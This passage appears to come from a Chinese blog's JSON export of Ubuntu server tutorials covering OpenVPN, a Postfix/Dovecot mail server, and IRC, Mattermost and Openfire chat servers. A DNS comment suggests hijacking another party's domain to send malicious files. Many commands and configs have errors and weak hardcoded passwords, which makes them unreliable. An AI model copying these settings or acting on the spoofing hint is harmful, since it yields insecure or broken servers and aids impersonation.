metwork-manager-openvpn-gnome\nsudo systemctl restart network-manager\n设置，网络，VPN，添加，从文件导入ovpn文件\n\n\n## 其他VPN客户端\nCisco Concentrator    # network-manager-vpnc\nCisco OpenConnect     # network-manager-openconnect\nPPTP(Microsoft VPN)   # network-manager-pptp\nstringSwan(for some IPsec VPNs)    # network-manager-strongswan\n\n```\n\n5.其他平台客户端\n```bash\n## Windows客户端\nhttps://openvpn.net/index.php/open-source/downloads.html\n# C:\\Program Files\\OpenVPN\\config\\client2.ovpn\n# 要以管理员身份运行\n\n##IOS \nApp Store搜索OpenVPN Connect\n\n## Android\nOpenVPN Connect\n\n## MacOS\nhttps://tunnelblick.net/downloads. html\n安装结束自动提示导入客户端配置文件\n\n```\n\n###### 撤销客户端证书\n1.CA Server\n```bash\ncd EasyRSA-3.0.4/\n./easyrsa revoke client2\n./easyrsa gen-crl    # 生成证书吊销列表CRL(crl.pem)\nscp pki/crl.pem xps@vpnserver_IP:/tmp\n```\n\n2.VPN Server\n```bash\n# 在vpn server调用\nsudo cp /tmp/crl.pem /etc/openvpn\nsudo vi /etc/openvpn/server.conf\n    crl-verify crl.pem    # 最后一行添加吊销指令\nsudo systemctl restart openvpn@server\n\n```\n\n\n\n\n\n\n\n\n","tags":["VPN"],"categories":["Linux"]},{"title":"ubuntu sever-邮件服务","url":"%2Fposts%2F36278%2F","content":"\n\n\n>直到今天，Emai仍然是互联网上最重要的信息传递方式之一\n\n\n## <font color=red> 电子邮件基础</font>\n\n快速、便捷、通用、异步通信方式\n1965年最早由MIT发明并开源（最早用于不同主机用户间通信）\n1971年确定邮件地址以`@`符号连接（在不同主机之间传递信息）\nMIME类型扩展邮件从纯文本到传递文件（文档、图片、媒体）\n\n邮件可被伪造，邮件炸弹，垃圾邮件\n\n**传统物理邮件：**\n写信->到本地邮局->目的邮局->收件人\n\n**电子邮件**\nClient1 -> Server1 -> Server2 -> Client2 （邮件地址通过DNS解析完成邮件路由）\n无收件人返回报错（不通知），连不上目标服务器周期重发（直至失败）\n\n\n#### SMTP（Simple Mail Transfer Protocol）\n- MTA(Mail transfer agents) 之间通信协议（SMTPD）\n    - 由很多小程序实现MTA所有功能\n- Sendmai、Postfix、Exim、Qmail\n- 客户端发起邮件 MUA -> MTA  也是用SMTP协议\n\n\n#### MTA(Mail Transfer Agent)\n常见的MTA软件：\n###### 1. Sendmial\n>一个MTA软件包\n\n- 处理着绝大多数互联网电子邮件\n- 开源免费版 / 商业版（GUI页面）\n- 配置过于`复杂`（默认配置已经可以良好工作）\n- 功能全面但性能不占优势\n\n\n###### 2. Postfix\n- 来自于IBM的开源MTA（`Ubuntu默认首选MTA`）\n- 速度优于Sendmail，配置管理更简单（配置文件、命令）\n- 可以平滑替换Sendmail（模块化）\n\n\n###### 3. Qmail\n- Postfix的可替代选择（模块化的MTA，用户、配置相分离）\n- 设计初衷是实现取代Sendmail的更安全快速的MTA\n- 从Sendmail迁移到Qmail过程复杂\n- 众多插件，包含WebMail、POP服务\n\n\n###### 4. Exim\n- 比Sendmail、Postfix更安全快速，但配置方式不同\n- 与Qmail都使用maildir格式邮箱存储\n\n\n#### 邮箱存储\n###### MBOX\n- 传统的mbox格式邮箱存储将`所有邮件存于一个文件中`（索引定位具体邮件）\n- 文件和索引损坏可能造成邮件丢失，`故障恢复困难`\n- 不适于存储于NFS挂载目录中\n\n\n###### MAILDIR\n- Maildir格式包含三个子目录`/cur`,`/new`,`/tmp`， 每个邮件分隔独立保存\n- 可并行访问，性能更高（mbox不支持）\n- 可用NFS作为邮箱存储\n\n\n###### MTA可直接投递和读取文件\n    更多时候邮件投递由MDA完成\n\n\n#### MDA(Mail Delivery Agent, 邮件投递代理)\nMDA比MTA`额外实现`自动过滤、回复、规则转存、杀毒等\n但邮件的`收`还是靠MTA\n\n\n常见的MDA软件：\n###### 1. Mailx\n- MDA + MUA（`Ubuntu的默认MDA`）\n- 来自MTA的邮件交给Mailx投递到用户邮箱（`/var/mail/`）\n- 主目录下：`.forward`文件实现自动转发（如：公司邮箱的邮件，通过.forward进行转发到私人邮箱）\n\n\n###### 2. main.local\n- 常用于BSD的MDA程序\n- 功能使用与Mailx类似\n\n\n\n###### 3. procmail\n- 最流行的MDA之一\n- Recipes允许用户自定义邮件处理脚本（`.procmailrc`）\n\n\n\n#### MUA(Mail User Agent)\n- 读取和展示邮箱中的邮件（不金慈宁宫邮件传递）\n- 在哪读邮件/邮件显示格式（MIME）\n\n\n常见类型的MUA：\n###### 1.Mailx\nMUA + MDA\n服务器本地直接读取邮箱mail\n\n\n###### 2.Dovecot\n>远程客户端访问邮箱\n\n- POP3(Post Office Protocol version 3)\n     适合单一客户端，单项通信协议(MUA <- MDA)\n- IMAP4(Internet Message Access Protocol 4)\n     适合多邮件客户端，双项同步协议( MUA <--> MDA)\n\n\n>最基本的：MTA+MDA+MUA\n\n典型命令：\n![](http://image.xpshuai.cn/ubuntu_mail_cmd.png)\n\n\n###### 3. 其他邮箱访问方式\n    Web Mail\n    WAPI（ 微软专有邮箱协议）\n\n\n###### 4. Fetchmail\n    自己本地邮箱服务器 <- 运行商邮件服务器(POP3 / IMAP)\n    适用于每月稳定互联网连接的小公司\n\n\n\n## <font color=red>电子邮件架构</font>\n#### 邮件结构\n- 信封：用于邮件路由，对用户透明不可见\n- 邮件头：邮件路由传输过程的记录日志（如果遇到不专业的小黑客，可以通过邮件头来溯源）\n- 邮件体：邮件要传递的具体内容\n\n#### SPAM\n- 垃圾邮件，不请自来的邮件（Junk）\n- 处理浪费时间、网络带宽、存储空间\n\n#### 病毒、木马、蠕虫、钓鱼邮件\n- 包含恶意附件、链接、伪装、诈骗内容\n- 存在安全风险，谨慎打开陌生邮件\n\n\n#### <font color=red>邮件规范</font>\n- `收件人`为事件直接相关人（其他相关人作为`抄送人`）\n- 次要相关人按职位顺序  CC(`抄送人`，收件人能看见我发给抄送人，`按职位顺序排列`)、BCC（`密送人`，收件人是不知道我发给密送人了）\n- 主题简介清晰，高度概括（`切忌把正文具体内容写到主题`）\n- 保证表述清楚的前提下邮件内容尽可能短（`避免语法错误`），不要使用模棱两可/时髦语言\n- 适当使用表情符\n- 回复、转发完整邮件流（`禁止单独新写邮件作为回复`）\n- 压缩附件\n- 附个人签名（公司的信息，职位，姓名 -> 或弄成二维码->不太建议，建议直接用`文本形式`）\n\n>沟通是所有企业面对的最大问题\n\n \n\n## <font color=red>Postfix简单部署</font>\nMTA(能发出邮件最关键的组件)\n\n1.先安装DNS服务器\n```bash\nsudo apt install bind9\n```\n2.配置\n```bash\n# sudo vim /etc/bind/named.conf.options\n    # 自己解析不了的域名，转发给互联网上其他的\n    forwarders {\n        8.8.8.8;\n    }\n  \n\n# sudo vim /etc/bind/named.conf.local\n    # 自己的域(可以是任何域名，虽然被别人占用的。可以用来发送恶意文件)\n    zone \"qq.com\"{\n        type master;\n        file \"/etc/bind/db.qq.com\";    # 区域文件\n    }\n  \n\n# cp /etc/bind/db.local.local\n# sudo vim /etc/bind/db.qq.com\n$TTL    604800\n@       IN      SOA     ns.qq.com. root.qq.com. (\n                              2         ; Serial\n                         604800         ; Refresh\n                          86400         ; Retry\n                        2419200         ; Expire\n                         604800 )       ; Negative Cache TTL\n;\n@       IN      NS      ns        # 创建NS记录\n@       IN      MX  5   mail      # 创建MX记录，优先级(值越大，优先级越低)\nns      IN      A       192.168.0.19    # NS的记录\nmail    IN      A       192.168.0.19    # MX的记录\npop     IN      A       192.168.0.19\nimap    IN      A       192.168.0.19\nsmtp    IN      A       192.168.0.19\n@       IN      A       192.168.0.19    # @代表本域域名自己\n\n```\n\n3.重启bind服务\n```bash\nsudo systemctl restart bind9\n```\n\n4.网络配置（配置静态ip）\n```bash\n# sudo vim /etc/netplan/50-cloud-init.yaml\n    dhcp4:no\n    addresses:[192.168.1.2/24]\n    gateway4:192.168.1.1\n    nameservers:\n            search:[qq.com]\n            addresses:[192.168.1.2]    # 指向邮箱服务器的ip\n\n\nsudo netplan apply\nsudo networkctrl status\n```\n\n5.修改主机名\n```bash\n#sudo vim /etc/hostname\n    mail.qq.com\n\n# 直接修改hostname后，重启后会变回去，所以修改下面的配置文件\n\n#sudo vim /etc/cloud/cloud.cfg\n    preserve_hostname:true\n\n```\n\n6.安装Postfix\n```bash\nsudo apt install postfix\n\n向导窗口，选择：\nInternet Site    # 一般选这个就好\nInternet Site  smarthost    # 智能主机\n操作系统的主机名    # mail.qq.com\n\ngrep mail /etc/group    # 会自动生成一个用户组mail\ngrep postfix /etc/group    # 会自动生成一个用户组postfix\n# 但是postfix默认使用操作系统的用户，要加入本地用户到相应组(只有该用户组的成员才可发邮件)\nsudo usermod -aG mail xps    \n# sudo useradd -m -G mail xxx2\n# sudo passwd xxx2\n# mail           # mail命令默认不安装，先安装\nsudo apt install mailutils    # 安装\nmail    # 再使用\n\nmail xps@qq.com    # 主要收件人\ncc:  xps2@163.com    # 抄送人\nSubject: test2    # 主题\nxxxxxx正文\n\n# ctrl + D 发送邮件\n\nsu xxx2        # 切换到该用户查看该用户收到的邮件\nmail           # 可以查看该用户收到的邮件\n\n单机邮件一般存在/var/mail/用户名\n\n# 一般大的邮箱服务商，如QQ，163等，会反查发件人邮件的地址是否是合法的\n```\n\n>目前，只能发邮件，不能收邮件\n\n\n\n## <font color=red>企业级Postfix邮件系统部署</font>\n#### 组件\n- Postfix: MTA\n- Dovecot: POP /IMAP服务\n- SASL: 身份认证\n- Postfixadmin: 管理邮件、虚拟域、别名等的WEB应用\n- LEMP：Postfixadmin的web环境依赖\n\n\n#### Postfix的两种域\n- Local Domain：为本系统账号投递邮件(`/etc/passwd`)\n- Virtual Domain：为非本系统账号投递邮件\n\n\n###### 1.安装LEMP\n```bash\nsudo apt install nginx\nsudo apt install mysql-server\n\nsudo mysql_secure_installation\nsudo mysql\nALTER USER 'root'@'localhost' INDETIFIED WITH mysql_native_password BY '1234';    # 修改登录方式\nFLUSH PROVILEGES;\n# mysql -u root -p1234\n\nsudo apt install php-fpm php-mysql\nsudo vim /etc/php/7.2/fpm/php.ini\n    cgi.fix_pathinfo=0\n    date.timezone = Asia/Shanghai\n\n\n## 验证能否正常使用\nsudo vim /etc/nginx/sites-avaliable/default\n    index index.php\n    server_name mail.qq.com;\n    location ~\\.php${\n        include snippets/fastcgi-php.conf;\n        fastcgi_pass unix:/run/php/php7.2-fpm.sock;\n    }\n    location ~/.ht{\n        deny all;\n    }\n\nsudo vim /var/www/html/info.php\n    <?php phpinfo(); ?>\n\n\nsystemctl restart nginx.service\nsystemctl restart php7.2-fmp.service\n```\n\n###### 2.安装Postfixadmin\n推荐手动下载源码，然后解压\n```bash\n# 安装依赖包\nsudo apt install php-imap php-mbstring php7.2-imap php7.2-mbstring\n# 下载源码\nsudo wget -P /opt https://github.com/postfixadmin/postfixadmin/archive/postfixadmin-3.2.4.tar.gz\ncd /opt && tar -xvf postfixadmin-3.2.tar.gz\nmv postfixadmin-postfixadmin3.2/ postfixadmin\n# /opt/postfixadmin/public/setup.php    # 做web界面配置的文件\n# 软链接目录\nln -s /opt/postfixadmin/public/ /var/www/html/pfa\n\n```\n\n###### 3.配置数据库\n```bash\n# mysql -u root -p\n# 创建数据库和名字\nCREATE DATABASE postfix_db;\nCREATE USER 'post_user'@'localhost' IDENTIFIED BY '1234';\nGRANT ALL PRIVILEGES ON postfix_db.* TO 'post_user'@'localhost'\nFLUSH PRIVILEGES;\n```\n\nPostfixadmin 数据库连接文件\n```bash\ncd /opt/postfixadmin/  && cp config.inc.php config.local.php\nsudo vim config.local.php\n    $CONF['configured'] = true;\n    $CONF['default_language'] = 'cn';\n    # 数据库连接信息\n    $CONF['database_type'] = 'mysqli';\n    $CONF['database_host'] = 'localhost';\n    $CONF['database_password'] = '1234';\n    $CONF['database_name'] = 'postfix_db'\n\n```\n\n###### 4.创建临时目录\n```bash\nmkdir /opt/postfixadmin/templates_c && chmod 755 -R /opt/postfixadmin/templates_c\nchown -R www-data:www-data /opt/postfixadmin/templates_c\n\n```\n\n\n###### 5.WEB安装阶段\n```bash\n# 访问前面设置的url和文件\nhttp://mail.qq.com/setup.php\n\n设置 setup password\n生成 setup password 的hash值，复制下来，添加到服务端中配置项\n# vim config.local.php\n$['setup_password'] = 'xxxxxxx hash xxxxxxxx'\n\n然后创建管理员账号与密码\n登录管理员账号\n\n```\n\n**创建虚拟域、邮箱账号**\n- 域名清单 -- 新建域\n- 虚拟用户清单 -- 新建邮箱（别名）\n\n<img src=\"http://image.xpshuai.cn/ubuntu_mail_virtual.png\"></img>\n\n<img src=\"http://image.xpshuai.cn/ubuntu_mail_virtual2.png\"></img>\n\n<img src=\"http://image.xpshuai.cn/ubuntu_mail_virtual3.png\"></img>\n\n\n###### 6.集成Postfix\n>以下命令以root权限运行\n```bash\napt install Postfix Postfix-mysql sasl2-bin    # sasl来实现身份认证\n```\n\n配置sasl自动启动\n```bash\n# vim /etc/default/saslauthd\n    START=yes\n\nsystemctl restart saslauthd.service\n```\n\n邮箱目录、访问账号、组\n```bash\n# 添加组账号vmail\ngroupadd -g 5000 vmail && mkdir -p /var/mail/vmail\n# 创建账号vmail, 属于组vmail\nuseradd -u 5000 vmail -s /usr/sbin/nologin -d /var/mail/vmail\nchown -R vmail:vmail /var/mail/vmail\n```\n\n###### 7.数据库配置(3个)\n数据库配置文件1\n```bash\nmkdir -p /etc/postfix/sql\n\n# 去数据库中找虚拟域的域名\nvim /etc/postfix/sql/mysql_virtual_domains_maps.cf\n    user = post_user\n    password = 1234\n    hosts = 127.0.0.1\n    dbname = postfix_db\n    query = SELECT domain FROM domain WHERE domain='%s' AND active='1'\n\n\n# 想要生效，配置加入 /etc/postfix/main.cf\npostconf -e virtual_mailbox_domains=mysql:/etc/postfix/sql/mysql_virtual_domains_maps.cf    # 使用上面配置的配置文件,来查询虚拟域\npostmap -q qq.com mysql:/etc/postfix/sql/mysql_virtul_domains_maps.cf    # 验证\n```\n\n\n数据库配置文件2\n```bash\n# 查邮箱\nvim /etc/postfix/sql/mysql_virtual_mailbox_maps.cf\n    user = post_user\n    password = 1234\n    hosts = 127.0.0.1\n    dbname = postfix_db\n    query = SELECT maildir FROM mailbox WHERE username='%s' AND active='1'\n\n\n# 想要生效，配置加入 /etc/postfix/main.cf\npostconf -e virtual_mailbox_domains=mysql:/etc/postfix/sql/mysql_virtual_mailbox_maps.cf    # 使用上面配置的配置文件\npostmap -q tom@qq.com mysql:/etc/postfix/sql/mysql_virtual_mailbox_maps.cf    # 验证\n```\n\n\n\n数据库配置文件3\n```bash\n# 查别名\nvim /etc/postfix/sql/mysql_virtual_alias_maps.cf\n    user = post_user\n    password = 1234\n    hosts = 127.0.0.1\n    dbname = postfix_db\n    query = SELECT goto FROM alias WHERE address='%s' AND active='1'\n\n\n# 想要生效，配置加入 /etc/postfix/main.cf\npostconf -e mysql_virtual_alias_maps=mysql:/etc/postfix/sql/mysql_virtual_alias_maps.cf    # 使用上面配置的配置文件\npostmap -q abuse@qq.com mysql:/etc/postfix/sql/mysql_virtual_alias_maps.cf    # 验证\n```\n\n\n权限，属主\n```bash\nchgrp postfix /etc/postfix/sql/mysql_*\n```\n\n>至此，postfixadmin与postfix MTA安装完成\n\n###### 8.启用SASL 强制 Postfix发邮件使用Dovecot进行`身份验证`\n```bash\n# vim /etc/postfix/main.cf\n\nsmtpd_sasl_type = dovecot\nsmtpd_sasl_path = private/auth\nsmtpd_sasl_auth_enable = yes\nsmtpd_sasl_security_options = noanonymous\nsmtpd_sasl_local_domain = $myhostname\nsmtpd_tls_security_level = may\nsmtpd_tls_auth_only = no\nsmtpd_recipient_restrictions = permit_mynetworks permit_sasl_authenticated reject_unauth_destination\n```\n\n###### 9.启动安全SMTP端口\n```bash\n# vim /etc/postfix/master.cf\nsubmission    inet    n     -    y    -    -    smtpd\n-o syslog_name=postfix/submission\n-o smtpd_tls_security_level=encrypt\n-o smtpd_sasl_aut_enable=yes\n-o smtpd_client_restrictions=permit_sasl_authenticated,reject\n-o milter_macro_daemon_name=ORIGINATING\n\nsmtps    inet    n    -    y    -    -    smtpd\n-o syslog_name=postfix/smtps\n-o smtpd_tls_wrappermode=yes\n-o smtpd_sasl_aut_enable=yes\n-o smtpd_client_restrictions=permit_sasl_authenticated,reject\n-o milter_macro_daemon_name=ORIGINATING\n\n```\n\n###### 10.验证配置\n```bash\n# 验证配置\npostcnf -n\n\n# 重启服务\nsytemctl restart postfix\n\n# 证书可自行替换\n```\n\n\n###### 11.安装/配置Dovecot\n```bash\n# 安装Dovecot\napt install dovecot-imapd dovecot-mysql dovecot-managesieved dovecot-pop3d\n\n# Sieve\n负责创建并将邮件自动放入指定用户文件夹\n```\n\n配置Dovecot（多配置文件）\n```bash\ncd /etc/dovecot/conf.d/ && vim 10-auth.conf    # 系统账号/SQL账号\n    auth_mechanisms = plain login\n    #!include auth-system.conf.ext\n    !include auth-sql.conf.ext    # 使用这个配置文件来访问数据库\n\n```\n\n配置SQL账号\n```bash\n# vim /etc/dovecot/conf.d/auth-sql.conf.ext\npassdb {\n    driver = sql\n    args = /etc/dovecot/dovecot-sql.conf.ext    # 连接数据库文件\n}\n\nuserdb {    # 用户数据库\n    driver = static\n    args = uid=vmail gid=vmail home=/var/mail/vmail/%d/%n\n}\n\n```\n\n连接数据库配置文件\n```bash\n# vim /etc/dovecot/conf.d/dovecot-sql.conf.ext\ndriver = mysql\nconnect = host=127.0.0.1 dbname=postfix_db password=1324\npassword_query = SELECT usernme,domain,password FROM mailbox WHERE username='%u',default_pass_schema=MD5-CRYPT\n\n```\n\n指定邮箱存储位置\n```bash\n# vim /etc/dovecot/conf.d/10-mail.conf\nmail_location = maildir:/var/mail/vmail/%d/%n/Maildir\nmail_privileged_group = mail\n\n```\n\n配置服务连接\n```bash\n# vim /etc/dovecot/conf.d/10-master.conf\nservice auth {\n    unix_listener auth-userdb {\n        mode = 0600    # 权限掩码\n        user = vmail\n        group = vmail\n    }\n    unix_listener /var/spool/postfix/privilege/auth {\n        mode = 0660\n        user = postfix\n        group = postfix\n    }\n    user = dovecot    # 修改为我们指定的dovecot永固\n}\n\n```\n\n配置sieve\n```bash\n# vim /etc/dovecot/conf.d/15-lda.conf\nprotocol lda {\n    mail_plugins = mail_plugin sieve    # sieve组件，会帮我们自动创建文件夹\n}\n\nchgrp vmail /etc/dovecot/dovecot.conf    # vmail执行Dovecot\n\n```\n\n\n重启服务\n```bash\nsystemctl restart dovecot\n```\n\n查看日志\n```bash\ntail -n 20 -f /var/log/mail.log\n# 可以看到前面的服务启动正常\n```\n\n\n###### 12.集成Postfix与Dovecot\n```bash\n# vim /etc/postfix/master.cf\ndovecot    unix    -    n    n    -    -    pipe\nflags = DRhu user=vmail:vmail argv=/usr/lib/dovecot/deliver -f ${sender} -d xxxxxx\n\n\n\n# vim /etc/postfix.main.cf\nvirtual_transport = dovecot\ndovecot_destination_recipient_limit=1\n\n\n## 重启服务\nsystemctl restart dovecot\n\ntail -n 20 -f /var/log/mail.log\n# 可以看到前面的服务启动正常\n```\n\n###### 13.测试\n发送邮件\n```bash\n使用postfixadmin 的web界面来发送邮件\n\n# 或者 使用mail发送邮件\napt install mailutils\necho \"hello xpshuai\" | mail \"test mail\" tom@qq.com\n\n```\n\n查看结果\n```bash\ntail -n 20 -f /var/log/mail.log\nls -l /var/mail/vmail    # 每个域的邮件存储的目录\n```\n\n增加其他虚拟域、邮箱(`jerry@taobao.com`)\n```bash\necho \"hello jerry, it's tom\" |mail -s \"Subject\"-a From\"tom\\<tom@qq.com>\\jerry@taobao.com\n```\n\n\n###### 配置邮件客户端\nOutlook,Thunderbird, ... ...\n添加新邮箱账号（名字，地址，密码）\n配置Imap、pop3、smtp等的地址，SSL加密\n\n\n\n\n## <font color=red>Web MAIL安装</font>\n各大邮件服务商全部提供Web Mail\n基于浏览器的统一使用体验（无序配置客户端）\n\n`Roundcube` -- 一款非常流行且稳定的Web Mail应用\n\n###### 1.安装依赖包（可选）\n```bash\napt install php7.2-intl php-imagick php7.2-ldap\n```\n\n###### 2.下载Roundcube\n```bash\ncd /var/www/html && wget https://github.com/roundcube/roundcubemail/releases/download/1.4.7/roundcubemail-1.4.7-complete.tar.gz\ntar -xvf roundcubemail-1.4.7-complete.tar.gz\nmv roundcubemail-1.4.7-complete webmail && cd webmail\n\n```\n\n###### 3.创建数据库\n```bash\nCREATE DATABASE roundcubedb;\nCREATE DATABASE routecubemail;\nCREATE USER 'roundcube'@'localhost' IDENTIFIED BY '1234';\nGRANT ALL PRIVILEGES ON roundcubedb.* 'roundcube'@'loocalhost';\nGRANT ALL PRIVILEGES ON routecubemail.* 'roundcube'@'loocalhost';\nFLUSH PRIVILEGES;\n```\n\n导入数据\n```bash\n# 当前目录下的SQL文件夹下的sql文件（针对不同类型的数据库进行导入）\nmysql -u roundcube -p roundcubedb < SQL/mysql.initial.sql\n\n```\n\n###### 4.配置站点文件\n```bash\n# 这里使用默认的配置文件\nvim /etc/nginx/sites-avaialable/default\n\nlocation /webmail {\n    root /var/www/html;s\n    index index.php;\n    location ~ ^/webmaik/(.+\\.php)$ {\n        root /var/www/html;\n        try files $uri=404;\n        fastcgi_index index.php;\n        fastcgi_pass unix:/run/php/php7.2-fpm.sock;\n        fastcgi_param SCRIPT_FILENAME $document_root $fastcgi_script_name;\n        include /etc/nginx/fastcgi_params;\n    }\n    location ~ ^/webmail/(README|INSTALL|LICENSE|CHANGELOG|UPGRADING)$ {\n        deny all;\n    }\n    location ~ ^/webmail/(bin|SQL|config|temp|logs)/ {\n        deny all;\n    }\n}\n\n```\n\n检查配置\n```bash\nnginx -t\n```\n\n重启服务\n```bash\nsystemctl restart nginx\n```\n\n###### 5.权限\n```bash\nchown -R www-data:www-data /var/www/html/webmail\nchmod 755 /var/www/html/webmail/temp  /var/www/html/webmail/logs\n\n```\n\n###### 6.Web安装阶段\n```bash\n# 访问路径\nhttp://mail.qq.com/webmail/installer\n\n## 检查环境\n# 一些组件可能没安装，可以安装\napt install php-dompdf\napt install php7.2-xml\n\n## 创建配置文件\n...\n# IP检查\n# 设置数据库密码\n# managesieve\n# ...具体的自己看配置\n\n## 初始化数据库\n\n```\n\n删除installer目录\n\n登录Web Mail\n```bash\n## 访问web界面\nhttp://mail.qq.com/webmail\n\n```\n\n","tags":["ubuntu server"],"categories":["Linux"]},{"title":"ubuntu sever-聊天服务","url":"%2Fposts%2F43174%2F","content":"\n\n\n## <font color=red>聊天服务与IRC服务</font>\n>沟通是最重要的问题\n\n- 发明网络的目的的沟通(信息交换)\n- 高效的沟通是生产力\n- 为什么不用QQ、微信、Telegram？\n    - 企业信息流经他人服务器（泄密）\n    - 内部信息内部传递效率更高\n    - 更专注于公司内部工作内容\n\n#### IRC\nInternet Relay Chat（因特网中继聊天）\n是一种通过网络的群体即时聊天方式（也可以用于个人间聊天）\n公开的协议（TCP和SSL协议）\nIRC服务器可以连接其他的IRC服务器形成一个IRC网络\n大多数的IRC服务器不需要客户注册登录\n目前已经很少见（黑客和老牌的技术群体的挚爱）\n部分流服务商依赖IRC协议进行信息传递\n\n###### IRC服务器的搭建\n`Ircd-Hybrid`为例\n- 安装配置简单\n- 系统资源占用低\n\n1.安装\n```bash\n# 安装服务端\nsudo apt install ircd-hybrid\n```\n\n2.管理员口令(operator)\n```bash\n# 设置管理员的密码（加密的方式保存密文）\nmkpaswd pass123    # 生成密文，一会在后面用\n\n```\n\n3.配置\n```bash\n# sudo vim /etc/ircd-hybrid/ircd.conf\n\nserverinfo {\n    name = \"irc.lab.com\"\n    description = \"LAB Campany IRC Server\"\n    network_name = \"This is my Beijing Office IRC Network\"\n    # 其他配置项...\n}\noperator {    # 管理员的片段（默认是注释的）\n    name = \"admin\"\n    user = \"*@*\";    # 限制可以连接的用户和ip地址，这里是所有用户所有主机\n    password = \"xxxxxx\" # 上面mkpaswd pass123 生成的密文\n}\n# 后面根据需要配置\n```\n\n4.Banner\n```bash\nsudo vim /etc/ircd-hybrid/ircd.motd    # 客户端登录信息的信息\n```\n\n5.重启服务\n```bash\nsudo systemctl restart ircd-hybrid.service\n```\n\n6.客户端\n```bash\n- mIRC      # Win下的一款商业软件\n- irssi    # Linux下常用\n\n# 安装\nsudo apt install irssi\nsudo apt install ident2    # 服务端才能访问该客户端的计算机名等信息\n\n# 客户端直接连接服务端就行\nirssi -c 192.168.175.130\n\n# 服务端口，默认 666x\n```\n\n\n7.客户端基本命令\n```bash\n/help    # 查看所有命令\n/help  channel\n/opera admin pass123\n/channel list    # 查看频道\n/channel add -auto #Football   # 添加频道\n/join #Football    # 加入指定的聊天室\n\n# 把自己提升为管理员身份\n/oper admin pass123\n\n```\n\n\n\n## <font color=red>MatterMost服务搭建</font>\n\n- irssi这种命令行的方式并不是很友好，MatterMost使用十分友好\n- 团队群聊SaaS平台\n- Go语言开发\n- 独立与操作系统的二进制部署方案(它已经给打包好了)\n- 基于MySQL、Postgresql数据库\n- Slack(收费)的替代选择方案(兼容Slack，二者可进行通信)\n- 全平台客户端支持（Web）\n- 免费版、收费版\n- 适用于企业内部团队文件共享和信息交换\n\n\n服务端：https://github.com/mattermost/mattermost-server\n客户端程序：https://github.com/mattermost/desktop\nWeb界面的：https://github.com/mattermost/mattermost-webapp\n\n\n#### 安装部署\n1.安装数据库\n```bash\n# 这里以mysql为例\nsudo apt install mysql-server\nsudo mysql_secure_installation\n```\n\n2.建库\n```sql\ncreate user 'muser'@'%' identified by '12345678';\n\ncreate database mattermost;\n\ngrant all privileges on mattermost.* to'muser'@'%';\n-- GRANT ALTER,CREATE,DELETE,DROP,INDEX,INSERT,SELECT,UPDATE ON mattermost.* to'muser'@'%';\n\nflush privileges;\n```\n\n3.下载mattermost\n```bash\nwget https://releases.mattermost.com/5.24.2/mattermost-5.24.2-linux-amd64.tar.gz\ntar -zxvf mattermost*.gz\nsudo mv mattermost /opt    # 个人安装的软件包，一般会放到opt下面\nsudo mkdir /opt/mattermost/data\ncd /opt\n```\n\n4.权限设置\n```bash\nsudo useradd -rU mattermost\nsudo chown -R mattermost:mattermost /opt/mattermost\nsudo chmod -R g+w /opt/mattermost\n```\n\n5.配置文件\n```bash\n# sudo vim /opt/mattermost/config/config.json\n# 这里配置数据库项， mattermost库的名字\n\"DriverName\": \"mysql\"\n\"DataSource\": \"muser:passw123@tcp(localhost:3360)/mattermost?charset=utf8mb4,utf8&readTimeout=30s&writeTimeout=30s\"\n```\n\n6.测试数据库连接\n```bash\nsudo -u mattermost /opt/mattermost/bin/mattermost\n# 重点关注端口是否正常开启，一般默认为8065端口\n```\n\n7.Systemd 服务单元文件\n```bash\n# mattermost本身是不带service的，所以我们可以手动创建\n\nsudo touch /lib/system/mattermost.service\n# 添加内容...\n```\n\n\n<img src=\"http://image.xpshuai.cn/20200704214555991_6879.png\" />\n\n8.中文字体\n\n```bash\n# sudo vim /opt/mattermost/config/config.json\n\"DefaultServerLocale\": \"zh-CN\"\n\"DefaultClientLocale\": \"zh-CN\"\n\"AvailableLocale\": \"zh-CN\"\n```\n\n9.启动服务\n\n```bash\nsudo systemctl daemon-reload\n# 修改完再启动服务\nsudo systemctl start mattermost.service\nsudo systemctl enable mattermost.service\n# 然后查看服务\nsudo systemctl status mattermost.service\n```\n\n10.Web配置\n```bash\n# 域名根据自己的来，或ip也行\nhttps://chat.lab.com:8065\n# 首个账号被赋予system_admin角色（管理员）\n\n建议：先建立一个团队(相当于一个聊天室)\n然后可以根据提示下载客户端\n\n```\n\n11.系统控制台配置\n```bash\n常规->服务端口(先指定页面上的命令，再在web界面修改)，证书，地址，data存储目录(本地存储/云存储),电子邮件通知\nsudo setcap_net_bind_service=+ep./bin/mattermost    # 修改服务端口\n```\n\n12.使用\n```bash\n# 别人进来的方式：\n1.邀请链接\n2.单独添加成员\n\n\n# 客户端：\n- Web版\n- 其他操作系统客户端\n\n# 支持其他插件，可以与第三方软件集成使用\n```\n\n文件的传送，共享文件，置顶文件\n\n\n\n\n\n## <font color=red>Openfire服务搭建</font>\n\n开源免费的IM即时通信服务器\nReal-time collaboration(RTC)\n由java开发，需要java运行环境\n使用拓展通讯和表示协议（XMPP）Extensible Messaging and Presence Protocol\n号称单台服务器可支持上万并发用户\n兼容所有支持XMPP协议的客户端(spark),不建议web的方式(基于flash)\n支持插件开发\n支持mysql、postgrersql、内建数据库\n支持LDAP、TLS、群集部署\n\n\n#### 搭建服务端\n1.java环境\n```bash\nsudo apt-get install openjdk-8-jdk\n\njava -version\n```\n\n2.数据库\n```bash\n# 这里以mysql为例\nsudo apt install mysql-server\nsudo mysql_secure_installation\n```\n\n3.建库\n```bash\ncreate database openfire;\n\ngrant all privileges on openfire.* to'fireuser'@'%' identified by 'pass123';\n\nflush privileges;\n```\n\n4.下载，安装\n```bash\n# http://www.igniterealtime.org/downloads/index.jsp#openfire\n\nsudo dpkg -i openfire.deb\n```\n\n5.导入数据库表\n```bash\nsudo mysql;\nshow databases;\n\nuse openfire;\nsource /usr/share/openfire/resources/databases/openfire_mysql.sql\n\nshow tables;\n```\n\n6.Web界面配置\n```bash\n## http://openfire.lab.com:9090\n#进行常用配置\n\n#数据库URL路径： 地址:端口:库名\njdbc:mysql://127.0.0.1/openfire?useUnicode=true&chasacterEncoding=UTF-8&characterSetResults=UTF-8&rewriteBatchedStatements=true\n\n# 通过Web进入管理界面\n```\n\n7.创建用户账号\n\n\n#### 客户端\n可以使用`spark`\nhttp://www.igniterealtime.org/downloads/index.jsp#openfire\n客户端登录忽略证书爆粗平\nspark使用5222端口连接服务端\n\n\n\n\n## Rochet 